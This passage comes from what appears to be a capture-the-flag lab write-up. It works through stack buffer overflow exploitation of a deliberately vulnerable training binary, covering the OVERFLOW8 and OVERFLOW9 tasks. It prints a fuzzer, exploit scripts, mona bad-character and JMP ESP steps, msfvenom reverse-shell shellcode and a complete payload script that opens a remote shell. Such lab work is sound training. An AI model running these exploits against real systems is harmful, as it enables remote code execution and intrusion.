payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 018CFA30

![800](img/Pasted%20image%2020240903181901.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 018CFA30

![800](img/Pasted%20image%2020240903181944.png)

mona Memory comparison results, item 0
 Address=0x018cfa30
 Status=Corruption after 28 bytes
 BadChars=00 1d 1e 2e 2f c7 c8 ee ef
 Type=normal
 Location=Stack


29. Based on the output 00 1d 1e 2e 2f c7 c8 ee ef Only use 00 1d 2e c7 ee to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 1d 2e c7 ee".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x1d\x2e\xc7\xee
```

	Task 9
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8?
			\x00\x1d\x2e\xc7\xee


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x1d\x2e\xc7\xee"

![800](img/Pasted%20image%2020240903182144.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW8 "  # The command or identifier expected by the target service
offset = 1786             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240903182322.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"

Go to View > Log 
From the Log Data, select the JMP ESP and double click to open.

![800](img/Pasted%20image%2020240903182411.png)


![800](img/Pasted%20image%2020240903182425.png)

![800](img/Pasted%20image%2020240903182548.png)

Possible JMP ESP:

625011AF
625011BB
625011D3
625011DF
625011EB
625011F7

`\xAF\x11\x50\x62
`\xBB\x11\x50\x62
`\xD3\x11\x50\x62
`\xDF\x11\x50\x62`
`\xEB\x11\x50\x62
`\xF7\x11\x50\x62`


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xba\x9b\xc8\x43\x0e\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc"
shellcode += b"\x03\xce\xc6\xa1\xfb\x0c\x3e\xa7\x04\xec\xbf"
shellcode += b"\xc8\x8d\x09\x8e\xc8\xea\x5a\xa1\xf8\x79\x0e"
shellcode += b"\x4e\x72\x2f\xba\xc5\xf6\xf8\xcd\x6e\xbc\xde"
shellcode += b"\xe0\x6f\xed\x23\x63\xec\xec\x77\x43\xcd\x3e"
shellcode += b"\x8a\x82\x0a\x22\x67\xd6\xc3\x28\xda\xc6\x60"
shellcode += b"\x64\xe7\x6d\x3a\x68\x6f\x92\x8b\x8b\x5e\x05"
shellcode += b"\x87\xd5\x40\xa4\x44\x6e\xc9\xbe\x89\x4b\x83"
shellcode += b"\x35\x79\x27\x12\x9f\xb3\xc8\xb9\xde\x7b\x3b"
shellcode += b"\xc3\x27\xbb\xa4\xb6\x51\xbf\x59\xc1\xa6\xbd"
shellcode += b"\x85\x44\x3c\x65\x4d\xfe\x98\x97\x82\x99\x6b"
shellcode += b"\x9b\x6f\xed\x33\xb8\x6e\x22\x48\xc4\xfb\xc5"
shellcode += b"\x9e\x4c\xbf\xe1\x3a\x14\x1b\x8b\x1b\xf0\xca"
shellcode += b"\xb4\x7b\x5b\xb2\x10\xf0\x76\xa7\x28\x5b\x1f"
shellcode += b"\x04\x01\x63\xdf\x02\x12\x10\xed\x8d\x88\xbe"
shellcode += b"\x5d\x45\x17\x39\xa1\x7c\xef\xd5\x5c\x7f\x10"
shellcode += b"\xfc\x9a\x2b\x40\x96\x0b\x54\x0b\x66\xb3\x81"
shellcode += b"\x9c\x36\x1b\x7a\x5d\xe6\xdb\x2a\x35\xec\xd3"
shellcode += b"\x15\x25\x0f\x3e\x3e\xcc\xea\xa9\x4b\x1a\xb5"
shellcode += b"\xd6\x24\x1e\x35\x0a\x84\x97\xd3\x26\xf6\xf1"
shellcode += b"\x4c\xdf\x6f\x58\x06\x7e\x6f\x76\x63\x40\xfb"
shellcode += b"\x75\x94\x0f\x0c\xf3\x86\xf8\xfc\x4e\xf4\xaf"
shellcode += b"\x03\x65\x90\x2c\x91\xe2\x60\x3a\x8a\xbc\x37"
shellcode += b"\x6b\x7c\xb5\xdd\x81\x27\x6f\xc3\x5b\xb1\x48"
shellcode += b"\x47\x80\x02\x56\x46\x45\x3e\x7c\x58\x93\xbf"
shellcode += b"\x38\x0c\x4b\x96\x96\xfa\x2d\x40\x59\x54\xe4"
shellcode += b"\x3f\x33\x30\x71\x0c\x84\x46\x7e\x59\x72\xa6"
shellcode += b"\xcf\x34\xc3\xd9\xe0\xd0\xc3\xa2\x1c\x41\x2b"
shellcode += b"\x79\xa5\x61\xce\xab\xd0\x09\x57\x3e\x59\x54"
shellcode += b"\x68\x95\x9e\x61\xeb\x1f\x5f\x96\xf3\x6a\x5a"
shellcode += b"\xd2\xb3\x87\x16\x4b\x56\xa7\x85\x6c\x73"
```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\xba\x9b\xc8\x43\x0e\xda\xce\xd9\x74\x24\xf4"
shellcode += "\x5d\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc"
shellcode += "\x03\xce\xc6\xa1\xfb\x0c\x3e\xa7\x04\xec\xbf"
shellcode += "\xc8\x8d\x09\x8e\xc8\xea\x5a\xa1\xf8\x79\x0e"
shellcode += "\x4e\x72\x2f\xba\xc5\xf6\xf8\xcd\x6e\xbc\xde"
shellcode += "\xe0\x6f\xed\x23\x63\xec\xec\x77\x43\xcd\x3e"
shellcode += "\x8a\x82\x0a\x22\x67\xd6\xc3\x28\xda\xc6\x60"
shellcode += "\x64\xe7\x6d\x3a\x68\x6f\x92\x8b\x8b\x5e\x05"
shellcode += "\x87\xd5\x40\xa4\x44\x6e\xc9\xbe\x89\x4b\x83"
shellcode += "\x35\x79\x27\x12\x9f\xb3\xc8\xb9\xde\x7b\x3b"
shellcode += "\xc3\x27\xbb\xa4\xb6\x51\xbf\x59\xc1\xa6\xbd"
shellcode += "\x85\x44\x3c\x65\x4d\xfe\x98\x97\x82\x99\x6b"
shellcode += "\x9b\x6f\xed\x33\xb8\x6e\x22\x48\xc4\xfb\xc5"
shellcode += "\x9e\x4c\xbf\xe1\x3a\x14\x1b\x8b\x1b\xf0\xca"
shellcode += "\xb4\x7b\x5b\xb2\x10\xf0\x76\xa7\x28\x5b\x1f"
shellcode += "\x04\x01\x63\xdf\x02\x12\x10\xed\x8d\x88\xbe"
shellcode += "\x5d\x45\x17\x39\xa1\x7c\xef\xd5\x5c\x7f\x10"
shellcode += "\xfc\x9a\x2b\x40\x96\x0b\x54\x0b\x66\xb3\x81"
shellcode += "\x9c\x36\x1b\x7a\x5d\xe6\xdb\x2a\x35\xec\xd3"
shellcode += "\x15\x25\x0f\x3e\x3e\xcc\xea\xa9\x4b\x1a\xb5"
shellcode += "\xd6\x24\x1e\x35\x0a\x84\x97\xd3\x26\xf6\xf1"
shellcode += "\x4c\xdf\x6f\x58\x06\x7e\x6f\x76\x63\x40\xfb"
shellcode += "\x75\x94\x0f\x0c\xf3\x86\xf8\xfc\x4e\xf4\xaf"
shellcode += "\x03\x65\x90\x2c\x91\xe2\x60\x3a\x8a\xbc\x37"
shellcode += "\x6b\x7c\xb5\xdd\x81\x27\x6f\xc3\x5b\xb1\x48"
shellcode += "\x47\x80\x02\x56\x46\x45\x3e\x7c\x58\x93\xbf"
shellcode += "\x38\x0c\x4b\x96\x96\xfa\x2d\x40\x59\x54\xe4"
shellcode += "\x3f\x33\x30\x71\x0c\x84\x46\x7e\x59\x72\xa6"
shellcode += "\xcf\x34\xc3\xd9\xe0\xd0\xc3\xa2\x1c\x41\x2b"
shellcode += "\x79\xa5\x61\xce\xab\xd0\x09\x57\x3e\x59\x54"
shellcode += "\x68\x95\x9e\x61\xeb\x1f\x5f\x96\xf3\x6a\x5a"
shellcode += "\xd2\xb3\x87\x16\x4b\x56\xa7\x85\x6c\x73"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW8 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 1786 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!

![800](img/Pasted%20image%2020240903183024.png)



# Task 10 oscp.exe - OVERFLOW9

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240904193307.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW8 test" to verify.

![800](img/Pasted%20image%2020240904193348.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![](img/Pasted%20image%2020240904193444.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW9 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW9 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240904193709.png)


10. Fuzzing crashed at 1600 bytes. Create a pattern by adding 400 bytes, total of 2000 bytes. 

![800](img/Pasted%20image%2020240904193738.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240904193807.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 2000

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW9 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8B